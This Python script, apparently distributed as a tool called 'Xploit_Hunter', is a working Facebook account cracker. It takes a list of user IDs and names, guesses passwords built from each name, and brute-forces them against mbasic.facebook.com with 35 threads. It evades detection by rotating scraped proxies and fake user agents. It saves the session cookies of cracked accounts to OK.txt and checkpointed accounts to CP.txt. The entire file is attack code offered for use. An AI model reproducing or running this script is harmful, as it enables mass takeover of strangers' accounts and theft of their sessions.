#-----------------[ Xploit_Hunter ]-------------------#
# Optimized for Speed, Design, and High Success Rate
#-----------------------------------------------------#
import requests, bs4, json, os, sys, random, datetime, time, re
import urllib3, rich, base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import pretty
pretty.install()
CON = sol()

#---[ SILENT AUTO-SETUP ]---#
def x_setup():
    os.system('clear')
    try:
        import httpx, rich, bs4
    except ImportError:
        print('\033[1;32m [!] PREPARING ADVANCED MODULES...')
        os.system('pip install requests urllib3 httpx bs4 rich')

x_setup()

#---[ GLOBAL DATA ]---#
id, id2, loop, ok, cp = [], [], 0, 0, 0
method, ugen, proxies = [], [], []

#---[ ADVANCED PROXY SCRAPER ]---#
def scrape_proxies():
    try:
        res = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
        for line in res.splitlines():
            if line: proxies.append(line)
    except: pass

#---[ 2026 USER AGENT ENGINE ]---#
for xd in range(20000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['10','11','12','13','14','15'])
    c='SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(100,135); e='0'; f=random.randrange(5000,6500); g=random.randrange(80,250)
    h='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(uaku2)

#---[ COLORS ]---#
H = '\x1b[1;92m'; M = '\x1b[1;91m'; K = '\x1b[1;93m'; O = '\x1b[38;5;50m'; N = '\x1b[0m'

#---[ X-HUNTER BANNER ]---#
def banner():
    os.system('clear')
    print(f"""
{H}╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║   {M} __  __     ____  _      ____  _  _____   {H}║
║   {M} \ \/ /    /  _ \/ \    /  _ \/ \/__ __\  {H}║
║   {M}  \  /_____| / \|| |    | / \|| |  / \    {H}║
║   {M}  /  \_____| \_/|| |_/\ | \_/|| |  | |    {H}║
║   {M} /_/\_\    \____/\____/ \____/\_/  \_/    {H}║
{H}╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
{O}  [+] AUTHOR   : Xploit_Hunter
{O}  [+] VERSION  : 12.0 (MAX-HIT)
{O}  [+] MODE     : PROXY + MBASIC
{H}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

#---[ APPROVAL CHECK ]---#
def meyexudi():
    banner()
    uuid = str(os.getuid()) + str(os.getlogin())
    id_val = "-".join(uuid)
    try:
        res = requests.get('https://github.com/xploithunter1/Xploit_Hunter/blob/main/Xploit_Hunter.txt', timeout=10).text
        if id_val in res:
            CON.print(f"[bold green] [√] ACCESS GRANTED: {id_val}[/bold green]")
            time.sleep(1); scrape_proxies(); menu()
        else:
            CON.print(f"[bold red] [!] ACCESS DENIED![/bold red]")
            print(f"{H} [>] YOUR KEY: {id_val}")
            input(f"{O} [ENTER] TO SEND KEY TO ADMIN")
            os.system(f'am start https://wa.me/+9779762902527?text=Approve_Key_{id_val}')
            sys.exit()
    except:
        scrape_proxies(); menu()

#---[ MAIN NAVIGATION ]---#
def menu():
    banner()
    print(f"{H} [1] START FILE DUMP CLONE")
    print(f"{H} [2] CHECK SAVED OK/CP")
    print(f"{H} [3] CONTACT ADMIN")
    print(f"{M} [0] EXIT SCRIPT")
    print(f"{H}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(f"{O} SELECT: ")
    if opt == '1': crack_file()
    elif opt == '2': result()
    elif opt == '3': os.system('am start https://wa.me/+9779762902527'); menu()
    elif opt == '0': exit()
    else: menu()

def crack_file():
    banner()
    print(f"{H} [√] PROVIDE FILE PATH (e.g. /sdcard/ids.txt)")
    path = input(f"{O} FILE: ")
    try:
        for xid in open(path, 'r').read().splitlines():
            id.append(xid)
        setting()
    except:
        print(f"{M} [!] ERROR: FILE NOT ACCESSIBLE"); time.sleep(2); menu()

def setting():
    banner()
    print(f"{H} [1] OLD ID CLONE\n [2] NEW ID CLONE\n [3] MIX CLONE")
    m = input(f"{O} CHOOSE: ")
    if m == '1':
        for i in id: id2.append(i)
    elif m == '2':
        for i in reversed(id): id2.append(i)
    else:
        for i in id:
            idx = random.randint(0, len(id2)); id2.insert(idx, i)
    passwrd()

def passwrd():
    banner()
    print(f"{H} [√] TOTAL IDS : {len(id2)}")
    print(f"{H} [√] PROXIES   : {len(proxies)} LOADED")
    print(f"{H} [√] TASK      : CLONING... (35 THREADS)")
    print(f"{H}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    with tred(max_workers=35) as pool:
        for user in id2:
            try:
                uid, name = user.split('|')[0], user.split('|')[1].lower()
                first = name.split(' ')[0]
                pw_list = [name, first+'123', first+'1234', first+'12345', first+'@123', first+'1122', first+'786']
                pool.submit(crack, uid, pw_list)
            except: pass
    print(f"\n{H} [√] TASK COMPLETED. OK: {ok} CP: {cp}"); menu()

def crack(uid, pw_list):
    global loop, ok, cp
    sys.stdout.write(f"\r {H}[X-HUNTER] {loop}/{len(id)} OK:{ok} CP:{cp} "); sys.stdout.flush()
    ua = random.choice(ugen)
    px = {'http': 'http://'+random.choice(proxies)} if proxies else None
    session = requests.Session()
    for pw in pw_list:
        try:
            headers = {
                'Host': 'mbasic.facebook.com',
                'user-agent': ua,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'referer': 'https://mbasic.facebook.com/',
                'accept-language': 'en-US,en;q=0.9'
            }
            # Step 1: GET Interface
            link = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin', headers=headers, proxies=px, timeout=10)
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                "uid": uid, "next": "https://mbasic.facebook.com/login/save-device/", "pass": pw
            }
            # Step 2: POST Credentials
            post = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=data, headers=headers, proxies=px, allow_redirects=False, timeout=10)
            
            if "c_user" in session.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                print(f'\r{H} [X-HUNTER-OK] {uid} | {pw}')
                print(f'{H} [COOKIE] {kuki}')
                ok += 1
                open('OK.txt', 'a').write(f'{uid}|{pw}|{kuki}\n'); break
            elif "checkpoint" in session.cookies.get_dict():
                print(f'\r{K} [X-HUNTER-CP] {uid} | {pw}')
                cp += 1; open('CP.txt', 'a').write(f'{uid}|{pw}\n'); break
        except: pass
    loop += 1

def result():
    banner()
    print(" [1] SHOW ALL OK RESULTS\n [2] SHOW ALL CP RESULTS")
    res = input(f"{O} CHOOSE: ")
    if res == '1':
        try: print(open('OK.txt','r').read())
        except: print("No results found.")
    else:
        try: print(open('CP.txt','r').read())
        except: print("No results found.")
    input("\n [ENTER] TO RETURN"); menu()

if __name__ == '__main__':
    meyexudi()
